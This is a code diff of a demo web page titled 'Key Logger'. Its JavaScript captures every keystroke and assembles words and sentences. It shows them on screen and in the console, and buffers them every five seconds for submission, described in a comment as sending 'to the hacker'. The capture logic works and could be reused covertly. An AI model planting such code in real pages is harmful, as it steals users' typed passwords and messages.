@@ -8,7 +8,11 @@
 <h2>Key Logger</h2>
 
 <div class="well">
-    <p>Feel free to type anything :)</p>
+    <p>
+        Feel free to type anything :)
+        The inputs are shown below or
+        press F12 to see more information.
+    </p>
     <div id="output"></div>
 </div>
 <div>
@@ -22,19 +26,19 @@
     var text = "";
     var outputDiv = document.getElementById("output");
 
-    //sending to console developer window
+    //add event listener to all keyboard events
     document.addEventListener("keydown", function (e) {
+        //log results
         var character_code = event.which || event.keyCode;
         var character_value = String.fromCharCode(character_code);
-
         console.log("Current character: " + character_code + " " + character_value);
         outputDiv.innerHTML += "Current character: " + character_code + " " + character_value + '<br />';
 
-        //get word // each letter
+        //collect characters -> word
         word += character_value;
 
         //32 = space
-        //get sentence
+        //collect words -> sentece
         if (character_code == 32) {
             console.log("Word " + word);
             outputDiv.innerHTML += "Word " + word + '<br />';
@@ -43,7 +47,7 @@
         }
 
         //13 = enter 190 = .
-        //get text
+        //collect sentences -> paragraphs
         if (character_code == 13 || character_code == 190) {
             sentence += word;
             console.log("Sentence: " + sentence);
@@ -54,7 +58,7 @@
         }
     });
 
-    // sending to client
+    // send the values to the hacker.
     setInterval(function () {
         if (text.length > 0) {
             console.log("Text for submission: " + text);
@@ -68,7 +72,7 @@
             sentence = "";
             word = "";
         }
-    }, 5000);
+    }, 5000); //check every 5 seconds
 </script>
 
 
